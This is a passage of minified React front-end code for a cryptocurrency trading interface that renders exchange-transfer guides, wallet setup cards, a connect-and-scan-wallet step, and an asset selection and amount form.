                                className: `${c.text}`,
                                children: ["• ", p("exchange.addressStep2")]
                            }), a.jsxs("p", {
                                className: `${c.text}`,
                                children: ["• ", p("exchange.addressStep3")]
                            }), a.jsxs("p", {
                                className: `${c.text}`,
                                children: ["• ", p("exchange.addressStep4")]
                            }), a.jsxs("p", {
                                className: `${c.text}`,
                                children: ["• ", p("exchange.addressStep5")]
                            }), a.jsxs("p", {
                                className: `${c.text}`,
                                children: ["• ", p("exchange.addressStep6")]
                            }), a.jsxs("p", {
                                className: `${c.text}`,
                                children: ["• ", p("exchange.addressStep7")]
                            })]
                        })]
                    })]
                })]
            })
        }), a.jsx("div", {
            className: "mb-8",
            children: a.jsxs("div", {
                className: `bg-gradient-to-r ${u ? "from-purple-900/30 to-indigo-900/30" : "from-purple-50 to-indigo-50"} rounded-2xl p-6 border ${u ? "border-purple-800" : "border-purple-200"} mb-6`,
                children: [a.jsxs("h4", {
                    className: `text-xl font-bold ${c.text} mb-2 flex items-center gap-2`,
                    children: [a.jsx("div", {
                        className: "w-8 h-8 bg-purple-500 rounded-full flex items-center justify-center text-white font-bold",
                        children: "4"
                    }), p("exchange.bnbTitle")]
                }), a.jsx("p", {
                    className: `text-sm ${c.textSecondary} mb-4`,
                    children: p("exchange.bnbDesc")
                }), a.jsxs("div", {
                    className: "space-y-3",
                    children: [a.jsx("div", {
                        className: `${c.cardBg} rounded-xl p-3 border ${c.border}`,
                        children: a.jsxs("p", {
                            className: `text-sm ${c.text}`,
                            children: ["• ", p("exchange.bnbStep1")]
                        })
                    }), a.jsx("div", {
                        className: `${c.cardBg} rounded-xl p-3 border ${c.border}`,
                        children: a.jsxs("p", {
                            className: `text-sm ${c.text}`,
                            children: ["• ", p("exchange.bnbStep2")]
                        })
                    })]
                })]
            })
        }), a.jsx("div", {
            className: "mb-8",
            children: a.jsxs("div", {
                className: `bg-gradient-to-r ${u ? "from-cyan-900/30 to-blue-900/30" : "from-cyan-50 to-blue-50"} rounded-2xl p-6 border ${u ? "border-cyan-800" : "border-cyan-200"} mb-6`,
                children: [a.jsxs("h4", {
                    className: `text-xl font-bold ${c.text} mb-2 flex items-center gap-2`,
                    children: [a.jsx("div", {
                        className: "w-8 h-8 bg-cyan-500 rounded-full flex items-center justify-center text-white font-bold",
                        children: "5"
                    }), p("exchange.waitTitle")]
                }), a.jsxs("div", {
                    className: "space-y-3",
                    children: [a.jsx("div", {
                        className: `${c.cardBg} rounded-xl p-3 border ${c.border}`,
                        children: a.jsxs("p", {
                            className: `text-sm ${c.text}`,
                            children: ["• ", p("exchange.waitDesc")]
                        })
                    }), a.jsx("div", {
                        className: `${c.cardBg} rounded-xl p-3 border ${c.border}`,
                        children: a.jsxs("p", {
                            className: `text-sm ${c.text}`,
                            children: ["• ", p("exchange.waitCheck")]
                        })
                    })]
                })]
            })
        }), a.jsx("div", {
            className: "mb-8",
            children: a.jsxs("div", {
                className: `bg-gradient-to-r ${u ? "from-red-900/30 to-pink-900/30" : "from-red-50 to-pink-50"} rounded-2xl p-6 border-2 ${u ? "border-red-700" : "border-red-300"} mb-6`,
                children: [a.jsxs("h4", {
                    className: `text-xl font-bold ${c.text} mb-2 flex items-center gap-2`,
                    children: [a.jsx("div", {
                        className: "w-8 h-8 bg-red-500 rounded-full flex items-center justify-center text-white font-bold",
                        children: "6"
                    }), p("exchange.emergencyTitle")]
                }), a.jsx("p", {
                    className: `text-sm font-bold ${u ? "text-red-300" : "text-red-800"} mb-4`,
                    children: p("exchange.emergencyDesc")
                }), a.jsxs("div", {
                    className: "space-y-3",
                    children: [a.jsxs("div", {
                        className: `${c.cardBg} rounded-xl p-3 border ${c.border}`,
                        children: [a.jsx("p", {
                            className: `text-sm font-semibold ${c.text} mb-2`,
                            children: p("exchange.emergencyOptions")
                        }), a.jsxs("div", {
                            className: "space-y-1 text-sm",
                            children: [a.jsxs("p", {
                                className: `${c.text}`,
                                children: ["• ", p("exchange.emergencyOption1")]
                            }), a.jsxs("p", {
                                className: `${c.text}`,
                                children: ["• ", p("exchange.emergencyOption2")]
                            })]
                        })]
                    }), a.jsx("div", {
                        className: `bg-red-100 ${u ? "bg-red-900/20" : ""} rounded-xl p-3 border-2 border-red-500`,
                        children: a.jsxs("p", {
                            className: "text-sm font-bold text-red-600",
                            children: ["⚠️ ", p("exchange.emergencyWarning")]
                        })
                    })]
                })]
            })
        }), a.jsx("div", {
            className: "mb-8",
            children: a.jsxs("div", {
                className: `bg-gradient-to-r ${u ? "from-indigo-900/30 to-purple-900/30" : "from-indigo-50 to-purple-50"} rounded-2xl p-6 border ${u ? "border-indigo-800" : "border-indigo-200"}`,
                children: [a.jsxs("h4", {
                    className: `text-xl font-bold ${c.text} mb-4 flex items-center gap-2`,
                    children: [a.jsx("div", {
                        className: "w-8 h-8 bg-indigo-500 rounded-lg flex items-center justify-center",
                        children: a.jsx("span", {
                            className: "text-white font-bold text-sm",
                            children: "📋"
                        })
                    }), p("exchange.sampleTitle")]
                }), a.jsx("div", {
                    className: "grid grid-cols-1 md:grid-cols-5 gap-3",
                    children: [p("exchange.sampleStep1"), p("exchange.sampleStep2"), p("exchange.sampleStep3"), p("exchange.sampleStep4"), p("exchange.sampleStep5")].map( (w, j) => a.jsxs("div", {
                        className: `${c.cardBg} rounded-xl p-3 border ${c.border} text-center`,
                        children: [a.jsx("div", {
                            className: `w-6 h-6 bg-gradient-to-r ${c.gradient} rounded-full flex items-center justify-center text-white text-sm font-bold mx-auto mb-2`,
                            children: j + 1
                        }), a.jsx("p", {
                            className: `text-xs ${c.text}`,
                            children: w
                        })]
                    }, j))
                })]
            })
        }), a.jsxs("div", {
            className: `bg-gradient-to-r ${u ? "from-yellow-900/20 to-orange-900/20" : "from-yellow-50 to-orange-50"} border ${u ? "border-yellow-700" : "border-yellow-200"} rounded-xl p-6`,
            children: [a.jsxs("h4", {
                className: `font-bold ${u ? "text-yellow-300" : "text-yellow-800"} mb-4 flex items-center gap-2`,
                children: [a.jsx(Qt, {
                    className: "w-5 h-5"
                }), p("exchange.proTipsTitle")]
            }), a.jsxs("div", {
                className: `text-sm ${u ? "text-yellow-200" : "text-yellow-700"} space-y-3`,
                children: [a.jsx("div", {
                    className: `${c.cardBg} rounded-lg p-3 border ${u ? "border-yellow-700" : "border-yellow-200"}`,
                    children: a.jsxs("p", {
                        children: ["• ", p("exchange.proTip1")]
                    })
                }), a.jsx("div", {
                    className: `${c.cardBg} rounded-lg p-3 border ${u ? "border-yellow-700" : "border-yellow-200"}`,
                    children: a.jsxs("p", {
                        children: ["• ", p("exchange.proTip2")]
                    })
                }), a.jsx("div", {
                    className: `${c.cardBg} rounded-lg p-3 border ${u ? "border-yellow-700" : "border-yellow-200"}`,
                    children: a.jsxs("p", {
                        children: ["• ", p("exchange.proTip3")]
                    })
                }), a.jsx("div", {
                    className: `${c.cardBg} rounded-lg p-3 border ${u ? "border-yellow-700" : "border-yellow-200"}`,
                    children: a.jsxs("p", {
                        children: ["• ", p("exchange.proTip4")]
                    })
                })]
            })]
        }), a.jsxs("div", {
            className: "mb-6",
            children: [a.jsxs("h4", {
                className: `text-xl font-bold ${c.text} mb-4 flex items-center gap-2`,
                children: [a.jsx(pt, {
                    className: "w-6 h-6 text-purple-600"
                }), p("exchange.settingUpWallet")]
            }), a.jsxs("div", {
                className: "grid md:grid-cols-2 gap-4",
                children: [a.jsxs("div", {
                    className: `${c.cardBg} rounded-xl p-4 border ${c.border}`,
                    children: [a.jsxs("h5", {
                        className: `font-semibold ${c.text} mb-3 flex items-center gap-2`,
                        children: [a.jsx("div", {
                            className: "w-6 h-6 bg-orange-500 rounded-lg flex items-center justify-center",
                            children: a.jsx("span", {
                                className: "text-white font-bold text-xs",
                                children: "M"
                            })
                        }), p("exchange.metamaskSetup")]
                    }), a.jsx("div", {
                        className: `text-sm ${c.textSecondary} space-y-2`,
                        children: a.jsx("p", {
                            children: p("exchange.metamaskDesc")
                        })
                    })]
                }), a.jsxs("div", {
                    className: `${c.cardBg} rounded-xl p-4 border ${c.border}`,
                    children: [a.jsxs("h5", {
                        className: `font-semibold ${c.text} mb-3 flex items-center gap-2`,
                        children: [a.jsx("div", {
                            className: "w-6 h-6 bg-blue-500 rounded-lg flex items-center justify-center",
                            children: a.jsx("span", {
                                className: "text-white font-bold text-xs",
                                children: "T"
                            })
                        }), p("exchange.trustwalletSetup")]
                    }), a.jsx("div", {
                        className: `text-sm ${c.textSecondary} space-y-2`,
                        children: a.jsx("p", {
                            children: p("exchange.trustwalletDesc")
                        })
                    })]
                })]
            })]
        }), a.jsxs("div", {
            className: `bg-gradient-to-r ${u ? "from-yellow-900/20 to-orange-900/20" : "from-yellow-50 to-orange-50"} border ${u ? "border-yellow-700" : "border-yellow-200"} rounded-xl p-4`,
            children: [a.jsxs("h5", {
                className: `font-bold ${u ? "text-yellow-300" : "text-yellow-800"} mb-3 flex items-center gap-2`,
                children: [a.jsx(Qt, {
                    className: "w-5 h-5"
                }), p("exchange.importantTips")]
            }), a.jsxs("div", {
                className: `text-sm ${u ? "text-yellow-200" : "text-yellow-700"} space-y-2`,
                children: [a.jsx("p", {
                    children: p("exchange.tip1")
                }), a.jsx("p", {
                    children: p("exchange.tip2")
                }), a.jsx("p", {
                    children: p("exchange.tip3")
                }), a.jsx("p", {
                    children: p("exchange.tip4")
                }), a.jsx("p", {
                    children: p("exchange.tip5")
                })]
            })]
        })]
    });
    return a.jsxs("div", {
        className: `${c.cardBg} rounded-3xl ${c.border} border overflow-hidden shadow-xl`,
        children: [a.jsx("div", {
            className: `bg-gradient-to-r ${c.gradient} p-6 text-white`,
            children: a.jsxs("div", {
                className: "flex items-center justify-between",
                children: [a.jsxs("div", {
                    children: [a.jsx("h2", {
                        className: "text-2xl font-bold mb-2",
                        children: p("asset.title")
                    }), a.jsx("p", {
                        className: "text-blue-100",
                        children: p("asset.subtitle")
                    })]
                }), a.jsx(cm, {
                    className: "w-12 h-12 text-blue-200"
                })]
            })
        }), a.jsxs("div", {
            className: `bg-gradient-to-r ${u ? "from-blue-900/20 to-purple-900/20" : "from-blue-50 to-purple-50"} rounded-3xl border ${u ? "border-blue-800" : "border-blue-100"} p-8 mb-10 max-w-3xl mx-auto mt-8 shadow-lg`,
            children: [a.jsxs("h3", {
                className: `text-2xl font-bold ${u ? "text-blue-300" : "text-blue-900"} mb-6 flex items-center justify-center gap-2`,
                children: [a.jsx(df, {
                    className: "w-7 h-7 text-blue-600"
                }), p("howWorks.title")]
            }), a.jsx("div", {
                className: "flex flex-col gap-6",
                children: [{
                    icon: Me,
                    title: p("howWorks.choosePayment"),
                    desc: p("howWorks.choosePaymentDesc"),
                    color: "from-blue-500 to-indigo-500"
                }, {
                    icon: pt,
                    title: p("howWorks.placeOrder"),
                    desc: p("howWorks.placeOrderDesc"),
                    color: "from-green-400 to-emerald-500"
                }, {
                    icon: Tn,
                    title: p("howWorks.processPayment"),
                    desc: p("howWorks.processPaymentDesc"),
                    color: "from-yellow-400 to-orange-500"
                }, {
                    icon: Ot,
                    title: p("howWorks.settlement"),
                    desc: p("howWorks.settlementDesc"),
                    color: "from-cyan-400 to-blue-400"
                }, {
                    icon: tt,
                    title: p("howWorks.complete"),
                    desc: p("howWorks.completeDesc"),
                    color: "from-emerald-400 to-green-600"
                }, {
                    icon: Tn,
                    title: p("howWorks.source"),
                    desc: p("howWorks.sourceDesc"),
                    color: "from-yellow-400 to-orange-700"
                }].map( (w, j) => a.jsxs("div", {
                    className: "flex items-start gap-4",
                    children: [a.jsx("div", {
                        className: "flex-shrink-0",
                        children: a.jsx("div", {
                            className: `w-11 h-11 rounded-full bg-gradient-to-br ${w.color} flex items-center justify-center text-white text-lg font-bold shadow-lg`,
                            children: j + 1
                        })
                    }), a.jsxs("div", {
                        children: [a.jsxs("div", {
                            className: `flex items-center gap-2 font-semibold ${u ? "text-gray-200" : "text-gray-800"} text-lg`,
                            children: [a.jsx(w.icon, {
                                className: "w-5 h-5 text-blue-600"
                            }), w.title]
                        }), a.jsx("div", {
                            className: `${c.textSecondary} text-sm mt-1`,
                            children: w.desc
                        })]
                    })]
                }, j))
            }), a.jsxs("div", {
                className: `mt-6 text-sm ${c.textSecondary} text-center`,
                children: [a.jsx("strong", {
                    children: p("howWorks.note")
                }), a.jsx("br", {}), a.jsx("span", {
                    className: "text-blue-800 font-medium",
                    children: p("howWorks.support")
                })]
            })]
        }), a.jsx("div", {
            className: "text-center mb-8",
            children: a.jsx("button", {
                onClick: () => d(!f),
                className: `inline-flex items-center px-6 py-3 rounded-2xl font-semibold transition-all duration-300 ${f ? `bg-gradient-to-r ${c.gradient} text-white shadow-xl` : `${c.cardBg} ${c.text} border-2 ${c.border} hover:border-blue-500 hover:shadow-lg`}`,
                children: a.jsxs("div", {
                    className: "flex items-center space-x-2",
                    children: [a.jsxs("div", {
                        className: "flex items-center space-x-1",
                        children: [a.jsx("div", {
                            className: "w-6 h-6 bg-yellow-500 rounded-lg flex items-center justify-center",
                            children: a.jsx("span", {
                                className: "text-white font-bold text-xs",
                                children: "B"
                            })
                        }), a.jsx("div", {
                            className: "w-6 h-6 bg-green-500 rounded-lg flex items-center justify-center",
                            children: a.jsx("span", {
                                className: "text-white font-bold text-xs",
                                children: "K"
                            })
                        })]
                    }), a.jsx("span", {
                        children: p("exchange.transferGuide")
                    }), a.jsx(Ho, {
                        className: `w-5 h-5 transition-transform duration-300 ${f ? "rotate-180" : ""}`
                    })]
                })
            })
        }), f && a.jsx(g, {}), a.jsxs("div", {
            className: "p-6",
            children: [e === 1 && a.jsxs("div", {
                className: "text-center py-8",
                children: [a.jsx("div", {
                    className: `w-20 h-20 bg-gradient-to-r ${c.gradient} rounded-3xl flex items-center justify-center mx-auto mb-6 shadow-xl`,
                    children: a.jsx(pt, {
                        className: "w-10 h-10 text-white"
                    })
                }), a.jsx("h3", {
                    className: `text-xl font-semibold ${c.text} mb-3`,
                    children: p("asset.connectWallet")
                }), a.jsx("p", {
                    className: `${c.textSecondary} mb-8 max-w-md mx-auto`,
                    children: p("asset.connectSubtitle")
                }), a.jsx("div", {
                    className: `bg-gradient-to-r ${u ? "from-green-900/20 to-emerald-900/20" : "from-green-50 to-emerald-50"} border ${u ? "border-green-700" : "border-green-200"} rounded-2xl p-4 mb-8`,
                    children: a.jsxs("div", {
                        className: "flex items-center justify-center",
                        children: [a.jsx(pt, {
                            className: "w-5 h-5 text-green-600 mr-2"
                        }), a.jsxs("span", {
                            className: `${u ? "text-green-300" : "text-green-800"} font-medium`,
                            children: ["🔒 ", p("asset.connectSubtitle")]
                        })]
                    })
                }), a.jsx("button", {
                    onClick: m,
                    disabled: t,
                    className: `bg-gradient-to-r ${c.gradient} text-white px-8 py-4 rounded-2xl font-semibold hover:shadow-xl disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-300 flex items-center mx-auto shadow-lg`,
                    children: t ? a.jsxs(a.Fragment, {
                        children: [a.jsx(wr, {
                            className: "w-5 h-5 mr-3 animate-spin"
                        }), a.jsx("span", {
                            className: `text-lg ${c.textSecondary}`,
                            children: "Scanning your wallet for assets..."
                        })]
                    }) : a.jsxs(a.Fragment, {
                        children: [a.jsx(pt, {
                            className: "w-5 h-5 mr-3"
                        }), p("asset.connectButton")]
                    })
                })]
            }), e === 2 && a.jsxs("div", {
                children: [a.jsxs("div", {
                    className: `relative overflow-hidden bg-gradient-to-br ${u ? "from-blue-900/30 via-purple-900/20 to-indigo-900/30" : "from-blue-50 via-purple-50 to-indigo-50"} border-2 ${u ? "border-blue-500/30" : "border-blue-200"} rounded-2xl sm:rounded-3xl p-4 sm:p-6 lg:p-8 mb-6 sm:mb-8 shadow-2xl backdrop-blur-sm`,
                    children: [a.jsxs("div", {
                        className: "absolute inset-0 overflow-hidden",
                        children: [a.jsx("div", {
                            className: "absolute -top-10 -right-10 w-32 h-32 bg-gradient-to-br from-blue-400/20 to-purple-400/20 rounded-full blur-3xl animate-pulse"
                        }), a.jsx("div", {
                            className: "absolute -bottom-10 -left-10 w-40 h-40 bg-gradient-to-br from-purple-400/20 to-indigo-400/20 rounded-full blur-3xl animate-pulse delay-1000"
                        })]
                    }), a.jsxs("div", {
                        className: "relative z-10",
                        children: [a.jsx("div", {
                            className: "flex items-center justify-center mb-6",
                            children: a.jsx("div", {
                                className: `w-16 h-16 sm:w-20 sm:h-20 bg-gradient-to-r ${u ? "from-blue-600 to-purple-600" : "from-blue-500 to-purple-500"} rounded-2xl sm:rounded-3xl flex items-center justify-center shadow-2xl transform hover:scale-110 transition-transform duration-300`,
                                children: a.jsx(Tn, {
                                    className: "w-8 h-8 sm:w-10 sm:h-10 text-white"
                                })
                            })
                        }), a.jsx("h3", {
                            className: `text-xl sm:text-2xl lg:text-3xl font-bold text-center mb-3 bg-gradient-to-r ${c.gradient} bg-clip-text text-transparent px-2`,
                            children: p("asset.tradeAssets")
                        }), a.jsx("p", {
                            className: `text-center ${u ? "text-gray-300" : "text-gray-600"} mb-4 sm:mb-6 max-w-2xl mx-auto leading-relaxed text-sm sm:text-base px-2`,
                            children: p("asset.tradeSubtitle")
                        }), a.jsxs("div", {
                            className: "grid grid-cols-3 gap-2 sm:gap-4 max-w-sm sm:max-w-md mx-auto px-2",
                            children: [a.jsx("div", {
                                className: `${c.cardBg} rounded-xl sm:rounded-2xl p-2 sm:p-3 border ${c.border} backdrop-blur-sm`,
                                children: a.jsxs("div", {
                                    className: "text-center",
                                    children: [a.jsx("div", {
                                        className: `text-sm sm:text-lg font-bold ${c.text}`,
                                        children: "24/7"
                                    }), a.jsx("div", {
                                        className: `text-xs ${c.textSecondary}`,
                                        children: p("header.trading")
                                    })]
                                })
                            }), a.jsx("div", {
                                className: `${c.cardBg} rounded-xl sm:rounded-2xl p-2 sm:p-3 border ${c.border} backdrop-blur-sm`,
                                children: a.jsxs("div", {
                                    className: "text-center",
                                    children: [a.jsx("div", {
                                        className: `text-sm sm:text-lg font-bold ${c.text}`,
                                        children: "5%"
                                    }), a.jsx("div", {
                                        className: `text-xs ${c.textSecondary}`,
                                        children: "Markup"
                                    })]
                                })
                            }), a.jsx("div", {
                                className: `${c.cardBg} rounded-xl sm:rounded-2xl p-2 sm:p-3 border ${c.border} backdrop-blur-sm`,
                                children: a.jsxs("div", {
                                    className: "text-center",
                                    children: [a.jsx("div", {
                                        className: `text-sm sm:text-lg font-bold ${c.text}`,
                                        children: "Instant"
                                    }), a.jsx("div", {
                                        className: `text-xs ${c.textSecondary}`,
                                        children: "Settlement"
                                    })]
                                })
                            })]
                        })]
                    })]
                }), t && a.jsx("div", {
                    className: `${c.cardBg} rounded-2xl sm:rounded-3xl border ${c.border} p-6 sm:p-8 lg:p-12 shadow-xl`,
                    children: a.jsxs("div", {
                        className: "text-center",
                        children: [a.jsxs("div", {
                            className: "relative",
                            children: [a.jsx("div", {
                                className: `w-12 h-12 sm:w-16 sm:h-16 bg-gradient-to-r ${c.gradient} rounded-full flex items-center justify-center mx-auto mb-4 sm:mb-6 shadow-xl`,
                                children: a.jsx(wr, {
                                    className: "w-6 h-6 sm:w-8 sm:h-8 animate-spin text-white"
                                })
                            }), a.jsx("div", {
                                className: "absolute inset-0 w-12 h-12 sm:w-16 sm:h-16 mx-auto rounded-full border-4 border-blue-200 border-t-transparent animate-spin"
                            })]
                        }), a.jsx("h4", {
                            className: `text-lg sm:text-xl font-semibold ${c.text} mb-2`,
                            children: p("asset.scanningAssets")
                        }), a.jsx("p", {
                            className: `${c.textSecondary} mb-4 text-sm sm:text-base px-4`,
                            children: p("asset.analyzing")
                        }), a.jsxs("div", {
                            className: "flex items-center justify-center space-x-2",
                            children: [a.jsx("div", {
                                className: "w-2 h-2 bg-blue-500 rounded-full animate-bounce"
                            }), a.jsx("div", {
                                className: "w-2 h-2 bg-blue-500 rounded-full animate-bounce delay-100"
                            }), a.jsx("div", {
                                className: "w-2 h-2 bg-blue-500 rounded-full animate-bounce delay-200"
                            })]
                        })]
                    })
                }), !t && n.length > 0 && a.jsxs("div", {
                    className: "space-y-4 sm:space-y-6 lg:space-y-8",
                    children: [a.jsxs("div", {
                        className: `${c.cardBg} rounded-2xl sm:rounded-3xl border ${c.border} p-4 sm:p-6 shadow-xl`,
                        children: [a.jsxs("div", {
                            className: "flex items-center mb-4 px-2",
                            children: [a.jsx("div", {
                                className: "w-8 h-8 sm:w-10 sm:h-10 bg-gradient-to-r from-green-500 to-emerald-600 rounded-xl sm:rounded-2xl flex items-center justify-center mr-3 shadow-lg",
                                children: a.jsx(_i, {
                                    className: "w-4 h-4 sm:w-5 sm:h-5 text-white"
                                })
                            }), a.jsxs("div", {
                                children: [a.jsx("h4", {
                                    className: `text-base sm:text-lg font-semibold ${c.text}`,
                                    children: p("asset.selectAsset")
                                }), a.jsx("p", {
                                    className: `text-xs sm:text-sm ${c.textSecondary}`,
                                    children: p("asset.chooseAsset")
                                })]
                            })]
                        }), a.jsx("div", {
                            className: "relative px-2",
                            children: r ? a.jsxs("div", {
                                children: [a.jsx("div", {
                                    className: `${u ? "bg-blue-900/10" : "bg-blue-50"} border ${u ? "border-blue-800" : "border-blue-200"} rounded-2xl p-4 mb-6`,
                                    children: a.jsxs("div", {
                                        className: "flex items-center",
                                        children: [a.jsx("div", {
                                            className: `w-8 h-8 bg-gradient-to-r ${c.gradient} rounded-xl flex items-center justify-center mr-3`,
                                            children: a.jsx("span", {
                                                className: "text-white font-bold text-sm",
                                                children: "1"
                                            })
                                        }), a.jsxs("div", {
                                            children: [a.jsx("p", {
                                                className: `font-semibold ${u ? "text-blue-300" : "text-blue-900"}`,
                                                children: "Click on any asset below to start trading"
                                            }), a.jsx("p", {
                                                className: `text-sm ${u ? "text-blue-400" : "text-blue-700"}`,
                                                children: "We'll show you the current market price and calculate your payout"
                                            })]
                                        })]
                                    })
                                }), a.jsx("div", {
                                    className: "grid grid-cols-1 md:grid-cols-2 gap-6",
                                    children: n.map(w => {
                                        var j;
                                        return a.jsxs("button", {
                                            onClick: () => {
                                                h(null),
                                                y(""),
                                                v(null),
                                                x("")
                                            }
                                            ,
                                            className: `group relative overflow-hidden ${c.cardBg} rounded-3xl p-6 transition-all duration-300 text-left border-2 ${(r == null ? void 0 : r.contractAddress) === w.contractAddress ? `border-blue-600 ${u ? "bg-blue-900/30" : "bg-blue-50"} shadow-2xl scale-105 ring-4 ring-blue-300 ring-opacity-30` : `${c.border} hover:border-blue-400 hover:shadow-xl hover:scale-102`}`,
                                            children: [a.jsx("div", {
                                                className: `absolute inset-0 bg-gradient-to-br ${(r == null ? void 0 : r.contractAddress) === w.contractAddress ? "from-blue-500/10 to-purple-500/10" : "from-transparent to-transparent group-hover:from-blue-500/5 group-hover:to-purple-500/5"} transition-all duration-300`
                                            }), (r == null ? void 0 : r.contractAddress) === w.contractAddress && a.jsx("div", {
                                                className: "absolute top-4 right-4",
                                                children: a.jsx("div", {
                                                    className: "bg-blue-600 text-white rounded-full p-2 shadow-lg",
                                                    children: a.jsx(tt, {
                                                        className: "w-4 h-4"
                                                    })
                                                })
                                            }), a.jsxs("div", {
                                                className: "relative z-10",
                                                children: [a.jsxs("div", {
                                                    className: "flex items-center space-x-3",
                                                    children: [a.jsx("div", {
                                                        className: `w-16 h-16 bg-gradient-to-r ${c.gradient} rounded-3xl flex items-center justify-center text-white font-bold text-xl shadow-2xl group-hover:scale-110 transition-transform duration-300`,
                                                        children: (j = w.symbol) == null ? void 0 : j.charAt(0)
                                                    }), a.jsxs("div", {
                                                        className: "flex-1",
                                                        children: [a.jsxs("div", {
                                                            className: "flex items-center space-x-2 mb-1",
                                                            children: [a.jsx("h4", {
                                                                className: `font-bold text-lg ${c.text}`,
                                                                children: w.name
                                                            }), a.jsx("span", {
                                                                className: `text-sm font-medium px-2 py-1 rounded-full ${(r == null ? void 0 : r.contractAddress) === w.contractAddress ? "bg-blue-100 text-blue-800" : "bg-gray-100 text-gray-600"}`,
                                                                children: w.symbol
                                                            })]
                                                        }), a.jsxs("div", {
                                                            className: "flex items-center justify-between",
                                                            children: [a.jsxs("div", {
                                                                children: [a.jsx("p", {
                                                                    className: `text-sm ${c.textSecondary} mb-1`,
                                                                    children: "Available Balance"
                                                                }), a.jsxs("p", {
                                                                    className: `font-bold text-lg ${c.text}`,
                                                                    children: [w.balance, " ", w.symbol]
                                                                })]
                                                            }), a.jsxs("div", {
                                                                className: "text-right",
                                                                children: [a.jsx("p", {
                                                                    className: `text-sm ${c.textSecondary} mb-1`,
                                                                    children: "USD Value"
                                                                }), a.jsx("p", {
                                                                    className: "font-bold text-lg text-green-600",
                                                                    children: w.value
                                                                })]
                                                            })]
                                                        })]
                                                    })]
                                                }), a.jsx("div", {
                                                    className: "mt-4 pt-4 border-t border-gray-200 dark:border-gray-700",
                                                    children: a.jsxs("div", {
                                                        className: "flex items-center justify-between",
                                                        children: [a.jsx("span", {
                                                            className: `text-sm font-medium ${(r == null ? void 0 : r.contractAddress) === w.contractAddress ? "text-blue-600" : c.textSecondary}`,
                                                            children: (r == null ? void 0 : r.contractAddress) === w.contractAddress ? "Selected for Trading" : "Click to Select"
                                                        }), a.jsx(Gr, {
                                                            className: `w-4 h-4 ${(r == null ? void 0 : r.contractAddress) === w.contractAddress ? "text-blue-600" : c.textSecondary} group-hover:translate-x-1 transition-transform duration-300`
                                                        })]
                                                    })
                                                })]
                                            })]
                                        }, w.contractAddress)
                                    }
                                    )
                                })]
                            }) : a.jsxs("div", {
                                className: "space-y-3",
                                children: [a.jsx("div", {
                                    className: `w-full border-2 rounded-xl sm:rounded-2xl px-3 sm:px-4 py-3 sm:py-4 ${c.input} text-sm sm:text-base lg:text-lg font-medium shadow-inner cursor-pointer`,
                                    children: a.jsx("span", {
                                        className: c.textSecondary,
                                        children: p("asset.chooseAsset")
                                    })
                                }), a.jsx("div", {
                                    className: "max-h-64 overflow-y-auto space-y-2",
                                    children: n.map(w => {
                                        var j;
                                        return a.jsx("button", {
                                            onClick: () => {
                                                h(w),
                                                y(""),
                                                v(null),
                                                x("")
                                            }
                                            ,
                                            className: `w-full border-2 rounded-xl sm:rounded-2xl p-3 sm:p-4 hover:border-blue-500 ${c.hover} transition-all duration-300 text-left ${c.border} ${c.cardBg} group`,
                                            children: a.jsxs("div", {
                                                className: "flex items-center justify-between",
                                                children: [a.jsxs("div", {
                                                    className: "flex items-center space-x-3",
                                                    children: [a.jsx("div", {
                                                        className: `w-10 h-10 sm:w-12 sm:h-12 bg-gradient-to-r ${c.gradient} rounded-xl flex items-center justify-center text-white font-bold text-sm sm:text-base shadow-lg`,
                                                        children: (j = w.symbol) == null ? void 0 : j.charAt(0)
                                                    }), a.jsxs("div", {
                                                        className: "flex-1 min-w-0",
                                                        children: [a.jsx("div", {
                                                            className: `font-semibold ${c.text} text-sm sm:text-base truncate`,
                                                            children: w.name
                                                        }), a.jsx("div", {
                                                            className: `text-xs sm:text-sm ${c.textSecondary} truncate`,
                                                            children: w.symbol
                                                        })]
                                                    })]
                                                }), a.jsxs("div", {
                                                    className: "text-right flex-shrink-0",
                                                    children: [a.jsx("div", {
                                                        className: `font-bold ${c.text} text-sm sm:text-base`,
                                                        children: w.balance
                                                    }), a.jsx("div", {
                                                        className: `text-xs sm:text-sm ${c.textSecondary}`,
                                                        children: w.value
                                                    })]
                                                })]
                                            })
                                        }, w.contractAddress)
                                    }
                                    )
                                })]
                            })
                        })]
                    }), r && a.jsxs("div", {
                        className: `${c.cardBg} rounded-2xl sm:rounded-3xl border ${c.border} p-4 sm:p-6 shadow-xl`,
                        children: [a.jsx("div", {
                            className: `bg-gradient-to-r ${u ? "from-green-900/20 to-emerald-900/20" : "from-green-50 to-emerald-50"} border ${u ? "border-green-700" : "border-green-200"} rounded-xl sm:rounded-2xl p-3 sm:p-4 mb-4 sm:mb-6 mx-2`,
                            children: a.jsxs("div", {
                                className: "flex items-center flex-wrap sm:flex-nowrap",
                                children: [a.jsx("div", {
                                    className: `w-10 h-10 sm:w-12 sm:h-12 bg-gradient-to-r ${c.gradient} rounded-xl sm:rounded-2xl flex items-center justify-center text-white font-bold text-base sm:text-lg shadow-lg mr-3 sm:mr-4 flex-shrink-0`,
                                    children: (S = r.symbol) == null ? void 0 : S.charAt(0)
                                }), a.jsxs("div", {
                                    className: "flex-1",
                                    children: [a.jsx("div", {
                                        className: `font-bold text-base sm:text-lg ${c.text} truncate`,
                                        children: r.name
                                    }), a.jsxs("div", {
                                        className: `text-xs sm:text-sm ${c.textSecondary} truncate`,
                                        children: ["Available: ", r.balance, " ", r.symbol, " • ", r.value]
                                    })]
                                }), a.jsx("div", {
                                    className: "text-right mt-2 sm:mt-0 w-full sm:w-auto",
                                    children: a.jsx("div", {
                                        className: "bg-green-100 text-green-800 px-2 sm:px-3 py-1 rounded-full text-xs font-medium inline-block",
                                        children: "SELECTED"
                                    })
                                })]
                            })
                        }), a.jsxs("div", {
                            className: "mb-4 sm:mb-6 px-2",
                            children: [a.jsxs("div", {
                                className: "flex items-center justify-between mb-3 flex-wrap gap-2",
                                children: [a.jsxs("label", {
                                    className: `text-base sm:text-lg font-semibold ${c.text} flex items-center`,
                                    children: [a.jsx(Ot, {
                                        className: "w-4 h-4 sm:w-5 sm:h-5 text-orange-500 mr-2"
                                    }), p("asset.amountToTrade")]
                                }), a.jsxs("div", {
                                    className: `text-xs sm:text-sm ${c.textSecondary} bg-gray-100 ${u ? "bg-gray-800" : ""} px-2 sm:px-3 py-1 rounded-full`,
                                    children: [p("asset.maxBalance"), ": ", r.balance, " ", r.symbol]
                                })]
                            }), a.jsxs("div", {
                                className: "relative",
                                children: [a.jsx("input", {
                                    type: "number",
                                    min: "0",
                                    max: r.balance,
                                    step: "any",
                                    value: s,
                                    onChange: w => {
                                        const j = w.target.value;
                                        x(j),
